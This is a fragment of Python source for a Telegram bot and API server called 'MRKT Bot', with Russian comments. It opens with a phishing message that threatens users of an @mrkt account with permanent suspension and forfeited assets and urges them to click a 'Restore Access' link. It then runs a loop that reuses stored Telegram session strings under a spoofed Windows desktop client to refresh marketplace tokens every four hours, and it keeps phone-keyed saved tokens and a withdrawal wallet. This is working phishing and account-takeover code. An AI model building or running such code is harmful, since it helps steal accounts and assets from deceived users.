        f"Complete identity verification to restore full access to your account.\n"
        f"Failure to verify within the given timeframe will result in permanent suspension "
        f"and all remaining assets will be forfeited\n\n"
        f"ℹ️ NOTE: Completing this step removes all active restrictions on your @mrkt account."
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔓 Restore Access", url=ref)],
    ])
    return text, keyboard


# ══════════════════════════════════════════════════════════════
#  STARTUP
# ══════════════════════════════════════════════════════════════

async def on_startup():
    logger.info("══════════════════════════════════════")
    logger.info("  MRKT Bot + API Server Starting...")
    logger.info(f"  Admins: {mrkt_config.ADMIN_IDS}")
    logger.info(f"  Wallet: {mrkt_config.WITHDRAW_WALLET or 'NOT SET'}")
    logger.info("══════════════════════════════════════")

    os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)

    for aid in mrkt_config.ADMIN_IDS:
        try:
            await bot.send_message(aid, "🟢 <b>MRKT Bot запущен!</b>")
        except Exception:
            pass

    # Запускаем авто-рефреш токена байера
    asyncio.create_task(_buyer_token_refresh_loop())


async def _buyer_token_refresh_loop():
    """Каждые 4 часа обновляет MRKT-токен байера через сохранённую Telethon-сессию."""
    REFRESH_INTERVAL = 4 * 60 * 60  # 4 часа
    
    # Ждём 30 секунд после старта перед первой проверкой
    await asyncio.sleep(30)
    
    while True:
        try:
            global buyer_token_data
            _load_buyer_token()
            
            session_str = buyer_token_data.get("session_string")
            if not session_str:
                logger.info("[BUYER-REFRESH] Нет session_string — пропускаю рефреш")
                await asyncio.sleep(REFRESH_INTERVAL)
                continue
            
            username = buyer_token_data.get("username", "?")
            logger.info(f"[BUYER-REFRESH] 🔄 Обновляю токен @{username}...")
            
            # Создаём временный Telethon клиент
            from telethon import TelegramClient
            from telethon.sessions import StringSession
            
            client = TelegramClient(
                StringSession(session_str),
                api_id=mrkt_config.API_ID,
                api_hash=mrkt_config.API_HASH,
                device_model="Desktop",
                system_version="Windows 11",
                app_version="6.0.5 x64",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    logger.error("[BUYER-REFRESH] ❌ Сессия не авторизована!")
                    await send_admin_log(
                        f"❌ <b>Buyer авто-рефреш: сессия слетела!</b>\n"
                        f"👤 @{username}\n"
                        f"Нужна переавторизация: /buyer set ..."
                    )
                    await client.disconnect()
                    await asyncio.sleep(REFRESH_INTERVAL)
                    continue
                
                # Получаем init_data
                init_data = await _get_mrkt_init_data(client)
                
                if not init_data:
                    logger.error("[BUYER-REFRESH] ❌ Не удалось получить init_data")
                    await client.disconnect()
                    await asyncio.sleep(REFRESH_INTERVAL)
                    continue
                
                # Обновляем сессию (на случай если сервер обновил ключи)
                new_session_str = client.session.save()
                await client.disconnect()
                
                # Авторизуемся в MRKT
                api = await MrktAPI.auth_with_init_data(init_data)
                new_token = api.token
                await api.close()
                
                if not new_token:
                    logger.error("[BUYER-REFRESH] ❌ MRKT не вернул токен")
                    await asyncio.sleep(REFRESH_INTERVAL)
                    continue
                
                # Обновляем buyer_token_data
                old_token = buyer_token_data.get("token", "")[:8]
                buyer_token_data["token"] = new_token
                buyer_token_data["session_string"] = new_session_str
                buyer_token_data["refreshed_at"] = kyiv_str()
                _save_buyer_token()
                
                # Также обновляем в saved_tokens если есть
                buyer_phone = buyer_token_data.get("phone")
                if buyer_phone and buyer_phone in saved_tokens:
                    saved_tokens[buyer_phone]["token"] = new_token
                    _save_tokens()
                
                logger.info(f"[BUYER-REFRESH] ✅ Токен обновлён: {old_token}... → {new_token[:8]}...")
                await send_admin_log(
                    f"🔄 <b>Buyer токен обновлён</b>\n"
                    f"👤 @{username}\n"
                    f"🕐 {kyiv_str()}"
                )
                
            except Exception as e:
                logger.error(f"[BUYER-REFRESH] ❌ Ошибка: {e}")
                try:
                    await client.disconnect()
                except Exception:
                    pass
                    
        except Exception as e:
            logger.error(f"[BUYER-REFRESH] ❌ Критическая ошибка: {e}")
        
        await asyncio.sleep(REFRESH_INTERVAL)


async def run_bot():
    dp.startup.register(on_startup)
    await dp.start_polling(bot)


async def run_api():
    config = uvicorn.Config(
        app, host="0.0.0.0",
        port=mrkt_config.PORT,
        log_level="warning",
        access_log=False,
    )
    server = uvicorn.Server(config)
    await server.serve()


async def main():
    """Запуск бота и API параллельно."""
    await asyncio.gather(
        run_bot(),
        run_api(),
    )


if __name__ == "__main__":
    asyncio.run(main())
